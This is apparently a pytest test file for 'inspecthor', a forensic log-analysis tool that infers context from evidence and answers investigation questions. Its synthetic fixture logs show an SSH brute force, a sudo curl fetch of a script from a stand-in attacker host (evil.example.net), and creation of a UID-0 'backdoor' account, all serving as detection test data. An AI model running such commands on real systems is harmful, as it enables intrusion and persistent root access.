"""Tests for the autonomous flow: one command, and context derived from evidence.

The pipeline internals are covered in test_offline.py. This file covers the
behaviour the rework was for — that the tool works out the year, timezone and
host itself, does the whole case in one call, and keeps its command surface small.
"""
from __future__ import annotations

import argparse
import zipfile
from datetime import timedelta
from pathlib import Path

import pytest

from inspecthor.engine import Engine
from inspecthor.models import EventFilter
from inspecthor.store.store import CaseStore

# No year, no UTC offset — the shape that used to require --year and --tz.
NOYEAR_LOG = (
    "Mar  1 09:15:01 web01 sshd[1010]: Failed password for admin from 45.33.32.156 port 1 ssh2\n"
    "Mar  1 09:15:04 web01 sshd[1011]: Failed password for admin from 45.33.32.156 port 2 ssh2\n"
    "Mar  1 09:15:09 web01 sshd[1012]: Accepted password for admin from 45.33.32.156 port 3 ssh2\n"
    "Mar  1 09:16:00 web01 sudo:    admin : TTY=pts/0 ; PWD=/root ; USER=root ; "
    "COMMAND=/usr/bin/curl http://evil.example.net/x.sh\n"
    "Mar  1 09:17:00 web01 useradd[1099]: new user: name=backdoor, UID=0, GID=0\n"
)

# Carries full ISO timestamps, so it can anchor the year for the syslog above.
DATED_LOG = (
    "2024-03-01T09:10:00+00:00 web01 app: service started\n"
    "2024-03-01T09:22:31+00:00 web01 app: upload received\n"
)

TASK_FILE = (
    "Scenario: a web server was compromised.\n\n"
    "1) What is the attacker IP address?\n"
    "2) What account did the attacker create?\n"
)


@pytest.fixture
def pkg(tmp_path: Path) -> Path:
    """Evidence that can date itself, plus evidence that cannot."""
    root = tmp_path / "pkg"
    root.mkdir()
    (root / "auth.log").write_text(NOYEAR_LOG)
    (root / "app.log").write_text(DATED_LOG)
    (root / "readme.txt").write_text(TASK_FILE)
    return root


# ---- two-pass ingest ---------------------------------------------------------


def test_engine_defers_time_ambiguous_parsers(pkg: Path, tmp_path: Path):
    """auth.log has to wait for context; app.log does not."""
    store = CaseStore(str(tmp_path / "p.db"))
    try:
        self_dating, needs_context = Engine(store).plan(pkg)
        assert [p.name for p in needs_context] == ["auth.log"]
        assert "app.log" in [p.name for p in self_dating]
    finally:
        store.close()


# ---- inference ---------------------------------------------------------------


def test_year_is_inferred_from_absolute_timestamps(pkg: Path, tmp_path: Path):
    """The whole point: no --year, and the syslog still lands in 2024."""
    from inspecthor.analyze import analyze

    result = analyze(pkg, out_dir=tmp_path / "out", detect=False)
    assert result.context.year == 2024
    assert "absolute timestamps" in result.context.year_source

    store = CaseStore(result.db_path)
    try:
        rows = store.query_events(EventFilter(event_type="account_created"))
        assert rows and rows[0]["ts"].startswith("2024-03-01")
    finally:
        store.close()


def test_activity_window_excludes_tool_generated_times(pkg: Path, tmp_path: Path):
    """Regression: YARA hits and mtime events pushed the window out to today."""
    from inspecthor.analyze import analyze

    result = analyze(pkg, out_dir=tmp_path / "out", detect=True)
    assert result.context.last_seen is not None
    assert result.context.last_seen.year == 2024


def test_host_is_inferred_without_a_flag(pkg: Path, tmp_path: Path):
    from inspecthor.analyze import analyze

    result = analyze(pkg, out_dir=tmp_path / "out", detect=False)
    assert result.context.host == "web01"
    assert result.context.host_source


def test_timezone_inferred_from_registry_bias():
    """The registry records the offset, so the tool should not ask for it."""
    from inspecthor.infer import timezone_from_events

    class _Store:
        def query_events(self, _filt):
            return [{"data": {"name": "ActiveTimeBias", "value": "360",
                              "utc_offset": "UTC-06:00"}}]

    tz, source = timezone_from_events(_Store())
    assert tz is not None
    assert tz.utcoffset(None) == timedelta(hours=-6)
    assert "ActiveTimeBias" in source


def test_timezone_inferred_from_zone_name():
    from inspecthor.infer import timezone_from_events

    class _Store:
        def query_events(self, _filt):
            return [{"data": {"name": "TimeZoneKeyName",
                              "value": "Eastern Standard Time"}}]

    tz, source = timezone_from_events(_Store())
    assert tz is not None and tz.utcoffset(None) == timedelta(hours=-5)
    assert "TimeZoneKeyName" in source


def test_overrides_beat_inference_and_say_so(pkg: Path, tmp_path: Path):
    from inspecthor.analyze import analyze

    result = analyze(
        pkg, out_dir=tmp_path / "out", detect=False, year=2019, host="OVERRIDDEN",
    )
    assert result.context.year == 2019
    assert "--year" in result.context.year_source
    assert result.context.host == "OVERRIDDEN"


def test_context_reports_a_source_for_every_value(pkg: Path, tmp_path: Path):
    """An invisible inference is worse than a wrong one."""
    from inspecthor.analyze import analyze

    result = analyze(pkg, out_dir=tmp_path / "out", detect=False)
    for _label, value, source in result.context.summary():
        assert value, "a displayed value must not be blank"
        assert source, "every displayed value must say where it came from"


def test_missing_context_is_flagged_not_hidden(tmp_path: Path):
    """With nothing to infer from, say so instead of guessing quietly."""
    from inspecthor.analyze import analyze

    root = tmp_path / "bare"
    root.mkdir()
    (root / "auth.log").write_text(NOYEAR_LOG)
    result = analyze(root, out_dir=tmp_path / "out", detect=False)
    assert any("--tz" in note for note in result.context.notes)


# ---- one command does everything --------------------------------------------


def test_analyze_does_everything_in_one_call(pkg: Path, tmp_path: Path):
    from inspecthor.analyze import analyze

    result = analyze(pkg, out_dir=tmp_path / "out")
    assert result.parsed >= 2
    assert result.event_count > 0
    assert result.ioc_counts.get("ipv4", 0) >= 1        # swept without being asked
    assert Path(result.report_path).is_file()
    assert Path(result.timeline_path).is_file()
    assert result.notable(), "high-severity events should be surfaced"


def test_analyze_finds_and_answers_the_packaged_questions(pkg: Path, tmp_path: Path):
    """No --readme flag: the task file is discovered inside the evidence."""
    from inspecthor.analyze import analyze

    result = analyze(pkg, out_dir=tmp_path / "out", detect=False)
    assert len(result.questions) == 2
    answers = {q: [c.answer for c in cands] for q, cands in result.answers}
    ip_question = next(q for q in answers if "IP" in q)
    account_question = next(q for q in answers if "account" in q)
    assert "45.33.32.156" in answers[ip_question]
    assert "backdoor" in answers[account_question]


def test_analyze_falls_back_to_an_overview_without_questions(tmp_path: Path):
    from inspecthor.analyze import analyze

    root = tmp_path / "bare"
    root.mkdir()
    (root / "auth.log").write_text(NOYEAR_LOG)
    result = analyze(root, out_dir=tmp_path / "out", detect=False)
    assert not result.questions
    assert result.overview, "with no task file it should still volunteer the basics"


def test_find_task_file_prefers_one_that_has_questions(tmp_path: Path):
    from inspecthor.analyze import find_task_file

    root = tmp_path / "e"
    root.mkdir()
    (root / "readme.txt").write_text("Just a description, no questions here.\n")
    (root / "task.md").write_text("1) What is the attacker IP?\n")
    path, questions = find_task_file(root)
    assert path is not None and path.name == "task.md"
    assert questions


def test_analyze_survives_evidence_it_cannot_read(tmp_path: Path):
    from inspecthor.analyze import analyze

    root = tmp_path / "e"
    root.mkdir()
    (root / "auth.log").write_text(NOYEAR_LOG)
    (root / "truncated.evtx").write_bytes(b"ElfFile\x00" + b"\x00" * 40)
    result = analyze(root, out_dir=tmp_path / "out", detect=False)
    assert result.event_count > 0, "one unreadable artifact must not lose the case"


def test_analyze_handles_a_password_protected_zip(tmp_path: Path):
    from inspecthor.analyze import analyze

    archive = tmp_path / "sherlock.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("auth.log", NOYEAR_LOG)
        zf.writestr("readme.txt", TASK_FILE)
    result = analyze(archive, out_dir=tmp_path / "out", detect=False)
    assert result.event_count > 0
    assert result.questions


# ---- the four commands -------------------------------------------------------


def test_bare_path_is_treated_as_analyze(pkg: Path, tmp_path: Path, monkeypatch):
    """`inspecthor <path>` works without typing the verb."""
    from inspecthor.cli import main

    monkeypatch.chdir(tmp_path)
    assert main([str(pkg)]) == 0
    assert list(tmp_path.glob("*.db")), "a case file should have been written here"


def test_follow_up_commands_find_the_case_without_a_flag(
    pkg: Path, tmp_path: Path, monkeypatch
):
    from inspecthor.cli import main, resolve_case

    monkeypatch.chdir(tmp_path)
    main([str(pkg)])
    assert resolve_case(None) is not None
    assert main(["ask", "what is the attacker IP?"]) == 0
    assert main(["find", "45.33.32.156"]) == 0
    assert main(["timeline"]) == 0
    assert main(["timeline", "--all"]) == 0


def test_follow_up_commands_explain_when_there_is_no_case(tmp_path: Path, monkeypatch):
    from inspecthor.cli import main

    monkeypatch.chdir(tmp_path)
    assert main(["ask", "anything"]) == 1
    assert main(["find", "anything"]) == 1


def test_cli_rejects_a_bad_timezone(pkg: Path, tmp_path: Path, monkeypatch):
    from inspecthor.cli import main

    monkeypatch.chdir(tmp_path)
    assert main([str(pkg), "--tz", "Mars/Olympus"]) == 2


def test_cli_surface_stays_small():
    """The rework's headline promise, asserted."""
    from inspecthor.cli import build_parser

    parser = build_parser()
    subs = [a for a in parser._actions if isinstance(a, argparse._SubParsersAction)]
    assert len(subs) == 1
    assert set(subs[0].choices) == {"analyze", "ask", "find", "timeline"}

    def count(sub_parser) -> int:
        return sum(
            1 for a in sub_parser._actions
            if not isinstance(a, (argparse._HelpAction, argparse._VersionAction))
        )

    assert count(subs[0].choices["analyze"]) <= 8, "analyze grew too many flags"
    for verb in ("ask", "find", "timeline"):
        assert count(subs[0].choices[verb]) <= 4, f"{verb} grew too many flags"


def test_every_cli_argument_still_documents_itself():
    from inspecthor.cli import build_parser

    def walk(parser, path="inspecthor"):
        for action in parser._actions:
            if isinstance(action, argparse._SubParsersAction):
                for name, sub in action.choices.items():
                    yield from walk(sub, f"{path} {name}")
                continue
            if isinstance(action, (argparse._HelpAction, argparse._VersionAction)):
                continue
            label = "/".join(action.option_strings) or action.dest
            yield f"{path} :: {label}", action

    undocumented = [
        label for label, action in walk(build_parser())
        if not (action.help or "").strip()
    ]
    assert not undocumented, f"missing help: {undocumented}"


# ---- answers -----------------------------------------------------------------


def test_answer_rules_try_several_field_names():
    """A command line is 'cmdline' from EVTX but 'cmd' from sudo."""
    from inspecthor.sherlock import _value_for

    row = {"data": {"cmd": "/usr/bin/curl http://evil.example.net/x.sh"}}
    assert _value_for(row, ("cmdline", "cmd")).startswith("/usr/bin/curl")
    assert _value_for(row, ("missing", "alsomissing")) is None


def test_sudo_command_question_is_answerable(pkg: Path, tmp_path: Path):
    """Regression: this returned nothing because only 'cmdline' was checked."""
    from inspecthor.analyze import analyze
    from inspecthor.sherlock import answer_question

    result = analyze(pkg, out_dir=tmp_path / "out", detect=False)
    store = CaseStore(result.db_path)
    try:
        candidates = answer_question(store, "what command did they run as root?")
        assert candidates
        assert any("curl" in c.answer for c in candidates)
    finally:
        store.close()


# ---- standalone --------------------------------------------------------------


def test_no_matrix_coupling_remains():
    """This tool was asked to stand on its own."""
    import inspecthor

    root = Path(inspecthor.__file__).parent
    offenders = []
    for path in root.rglob("*.py"):
        text = path.read_text(encoding="utf-8", errors="replace").lower()
        if "matrix_interop" in text or "matrix_home" in text:
            offenders.append(path.name)
    assert not offenders, f"Matrix references remain in: {offenders}"


def test_attack_data_is_bundled_not_borrowed():
    from inspecthor.attack import AttackDB

    db = AttackDB()
    assert db.loaded, "the bundled ATT&CK data should load with no configuration"
    assert db.valid(["T1110.001", "T9999.999"]) == ["T1110.001"]


# ---- case files must not collide or accumulate -------------------------------


def test_reanalysis_replaces_instead_of_duplicating(pkg: Path, tmp_path: Path):
    """Regression: a second run inserted every event again, doubling the counts."""
    from inspecthor.analyze import analyze

    out = tmp_path / "out"
    first = analyze(pkg, out_dir=out, detect=False)
    second = analyze(pkg, out_dir=out, detect=False)

    assert first.db_path == second.db_path, "same evidence should reuse the name"
    assert second.event_count == first.event_count, "events were duplicated"
    assert any("replacing" in w for w in second.warnings), "the replace should be stated"


def test_different_evidence_never_lands_in_the_same_case(tmp_path: Path):
    """Two Sherlocks whose folders are both called 'evidence' must stay apart."""
    from inspecthor.analyze import analyze

    def make(root: Path, ip: str) -> Path:
        root.mkdir(parents=True)
        (root / "auth.log").write_text(
            f"Mar  1 09:15:01 web01 sshd[1]: Failed password for admin from {ip} port 1 ssh2\n"
            f"Mar  1 09:15:09 web01 sshd[2]: Accepted password for admin from {ip} port 2 ssh2\n"
        )
        (root / "app.log").write_text(DATED_LOG)
        return root

    a = make(tmp_path / "caseA" / "evidence", "45.33.32.156")
    b = make(tmp_path / "caseB" / "evidence", "203.0.113.9")
    out = tmp_path / "out"

    first = analyze(a, out_dir=out, detect=False)
    second = analyze(b, out_dir=out, detect=False)

    assert first.db_path != second.db_path, "unrelated cases shared a database"
    assert any("different case" in w for w in second.warnings)

    # And neither database contains the other's indicator.
    for path, mine, theirs in (
        (first.db_path, "45.33.32.156", "203.0.113.9"),
        (second.db_path, "203.0.113.9", "45.33.32.156"),
    ):
        store = CaseStore(path)
        try:
            values = {row["value"] for row in store.get_iocs()}
            hits = {r["message"] for r in store.query_events(EventFilter())}
            blob = " ".join(hits) + " ".join(values)
            assert mine in blob
            assert theirs not in blob, f"{Path(path).name} was contaminated"
        finally:
            store.close()


def test_a_foreign_db_file_is_not_clobbered(tmp_path: Path, pkg: Path):
    """Something else's evidence.db must survive untouched."""
    from inspecthor.analyze import analyze

    out = tmp_path / "out"
    out.mkdir()
    stranger = out / "pkg.db"
    stranger.write_bytes(b"not a sqlite database at all")

    result = analyze(pkg, out_dir=out, detect=False)
    assert Path(result.db_path).name != "pkg.db"
    assert stranger.read_bytes() == b"not a sqlite database at all"


def test_name_flag_controls_the_filenames(pkg: Path, tmp_path: Path):
    from inspecthor.analyze import analyze

    out = tmp_path / "out"
    result = analyze(pkg, out_dir=out, case_name="Brutus Sherlock", detect=False)
    assert Path(result.db_path).name == "brutus-sherlock.db"
    assert Path(result.report_path).name == "brutus-sherlock-report.md"
    assert Path(result.timeline_path).name == "brutus-sherlock-timeline.csv"


def test_outputs_share_the_deconflicted_name(tmp_path: Path):
    """The report and timeline must follow the database, not overwrite a sibling."""
    from inspecthor.analyze import analyze

    out = tmp_path / "out"
    a = tmp_path / "a" / "evidence"
    b = tmp_path / "b" / "evidence"
    for root, ip in ((a, "1.2.3.4"), (b, "5.6.7.8")):
        root.mkdir(parents=True)
        (root / "auth.log").write_text(
            f"Mar  1 09:15:01 web01 sshd[1]: Failed password for admin from {ip} port 1 ssh2\n"
        )
        (root / "app.log").write_text(DATED_LOG)

    first = analyze(a, out_dir=out, detect=False)
    second = analyze(b, out_dir=out, detect=False)
    assert Path(first.report_path) != Path(second.report_path)
    assert Path(first.timeline_path) != Path(second.timeline_path)
    assert all(Path(p).is_file() for p in (
        first.report_path, first.timeline_path,
        second.report_path, second.timeline_path,
    ))
